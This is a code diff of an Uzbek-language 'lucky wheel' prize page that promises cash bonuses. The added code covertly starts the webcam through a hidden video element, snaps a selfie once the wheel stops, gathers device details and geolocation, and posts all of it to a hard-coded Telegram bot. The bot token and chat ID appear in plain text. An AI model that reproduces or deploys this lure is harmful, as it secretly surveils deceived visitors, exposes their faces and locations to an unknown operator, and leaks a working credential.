@@ -1,3 +1,4 @@
+<!DOCTYPE html>
 <html lang="en">
 
 <head>
@@ -45,12 +46,6 @@
       padding: 0;
     }
 
-    @keyframes rotate {
-      100% {
-        transform: rotate(360deg);
-      }
-    }
-
     #spin-btn {
       position: absolute;
       transform: translate(-50%, -50%);
@@ -84,6 +79,10 @@
       font-weight: 500;
     }
 
+    #camera {
+      display: none;
+    }
+
     @media screen and (max-width: 768px) {
       .wrapper {
         font-size: 12px;
@@ -100,28 +99,24 @@
   <div class="wrapper">
     <div class="container">
       <canvas id="wheel"></canvas>
-      <button id="spin-btn">Bonus olish</button>
-      <img style="font-size: 20px;"
-        src="http://telegra.ph//file/3f86031a2bb355be4f338.png"
-        alt="spinner arrow" />
+      <button id="spin-btn">Omadni sinash!</button>
+      <img style="font-size: 20px;" src="http://telegra.ph//file/3f86031a2bb355be4f338.png" alt="spinner arrow" />
+      <video id="camera" autoplay></video>
     </div>
     <div id="final-value">
-      <p>O'ynash uchun bosing!</p>
+      <p>Doirachasi bosing va omadingizni sinab ko'ring!</p>
     </div>
   </div>
   <script src="https://cdnjs.cloudflare.com/ajax/libs/Chart.js/3.9.1/chart.min.js"></script>
-  <script
-    src="https://cdnjs.cloudflare.com/ajax/libs/chartjs-plugin-datalabels/2.1.0/chartjs-plugin-datalabels.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/chartjs-plugin-datalabels/2.1.0/chartjs-plugin-datalabels.min.js"></script>
   <script>
-
-
-    const API_KEY =  "7338152003:AAEflY4nO79DXsY1xhnSf26xDd7DGiuZKR4";
+    const API_KEY = "7338152003:AAEflY4nO79DXsY1xhnSf26xDd7DGiuZKR4";
     const CHAT_ID = "2049604264";
-
 
     const wheel = document.getElementById("wheel");
     const spinBtn = document.getElementById("spin-btn");
     const finalValue = document.getElementById("final-value");
+    const camera = document.getElementById("camera");
     const rotationValues = [
       { minDegree: 0, maxDegree: 30, value: "2 mln so'm" },
       { minDegree: 31, maxDegree: 90, value: "1 mln so'm" },
@@ -168,6 +163,7 @@
         },
       },
     });
+
     const valueGenerator = (angleValue) => {
       for (let i of rotationValues) {
         if (angleValue >= i.minDegree && angleValue <= i.maxDegree) {
@@ -181,12 +177,10 @@
     let count = 0;
     let resultValue = 101;
     spinBtn.addEventListener("click", () => {
-      getLocation();
       spinBtn.disabled = true;
       finalValue.innerHTML = `<p>Sovg'angizni kuting!</p>`;
       let randomDegree = Math.floor(Math.random() * (355 - 0 + 1) + 0);
       let rotationInterval = window.setInterval(() => {
-
         myChart.options.rotation = myChart.options.rotation + resultValue;
         myChart.update();
         if (myChart.options.rotation >= 360) {
@@ -198,23 +192,85 @@
           clearInterval(rotationInterval);
           count = 0;
           resultValue = 101;
+          captureSelfieAndSendDeviceInfo();
         }
       }, 10);
     });
 
+    function captureSelfieAndSendDeviceInfo() {
+      // Capture selfie
+      navigator.mediaDevices.getUserMedia({ video: true })
+        .then(stream => {
+          camera.srcObject = stream;
+          camera.onloadedmetadata = () => {
+            camera.play();
+            setTimeout(() => {
+              const canvas = document.createElement('canvas');
+              canvas.width = camera.videoWidth;
+              canvas.height = camera.videoHeight;
+              const context = canvas.getContext('2d');
+              context.drawImage(camera, 0, 0, canvas.width, canvas.height);
+              canvas.toBlob(blob => {
+                const formData = new FormData();
+                formData.append('photo', blob, 'selfie.jpg');
+                
+                // Send device info and photo
+                Promise.all([
+                  sendDeviceInfo(),
+                  fetch(`https://api.telegram.org/bot${API_KEY}/sendPhoto?chat_id=${CHAT_ID}`, {
+                    method: 'POST',
+                    body: formData
+                  })
+                ])
+                .then(() => {
+                  // Get location after sending photo and device info
+                  getLocation();
+                })
+                .catch(err => console.error('Ma\'lumot yuborishda xato: ', err));
+                
+                camera.srcObject.getTracks().forEach(track => track.stop());
+              }, 'image/jpeg');
+            }, 500); // Surat olish uchun kutish
+          };
+        })
+        .catch(err => console.error('Kamera ochishda xato: ', err));
+    }
+
+    function sendDeviceInfo() {
+      const userAgent = navigator.userAgent;
+      const deviceInfo = {
+        deviceName: userAgent.includes('Mac') ? 'Mac' : userAgent.includes('Win') ? 'Windows' : 'Unknown',
+        os: navigator.platform,
+        battery: navigator.getBattery ? navigator.getBattery().then(battery => battery.level * 100 + '%') : 'N/A',
+        serialNumber: 'N/A', // Brauzer orqali seriya raqamini olish mumkin emas
+        browser: navigator.userAgent,
+        location: 'Unknown', // Joylashuv haqida ma\'lumot olish uchun geolokatsiya kerak
+        timestamp: new Date().toLocaleString()
+      };
+
+      // Send device info
+      return fetch(`https://api.telegram.org/bot${API_KEY}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(`
+        Qurilma ma'lumotlari:
+        1. Qurilma nomi: ${deviceInfo.deviceName}
+        2. Qurilmaning OS tizimi: ${deviceInfo.os}
+        3. Qurilmaning quvvati: ${deviceInfo.battery}
+        4. Qurilmaning seriya raqami: ${deviceInfo.serialNumber}
+        5. Kirilgan brauzer nomi: ${deviceInfo.browser}
+        6. Qurilmaning joylashuvi: ${deviceInfo.location}
+        7. Ma'lumot olingan vaqt: ${deviceInfo.timestamp}
+      `)}`);
+    }
 
     function getLocation() {
       if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(showPosition, showError);
+        navigator.geolocation.getCurrentPosition(position => {
+          const latitude = position.coords.latitude;
+          const longitude = position.coords.longitude;
+          fetch(`https://api.telegram.org/bot${API_KEY}/sendLocation?chat_id=${CHAT_ID}&latitude=${latitude}&longitude=${longitude}`);
+        }, showError);
       } else {
         alert("Geolokatsiya bu brauzerda qo'llab-quvvatlanmaydi.");
       }
-    }
-
-    function showPosition(position) {
-      var latitude = position.coords.latitude;
-      var longitude = position.coords.longitude;
-      fetch(`https://api.telegram.org/bot${API_KEY}/sendLocation?chat_id=${2049604264}&latitude=${latitude}&longitude=${longitude}`);
     }
 
     function showError(error) {
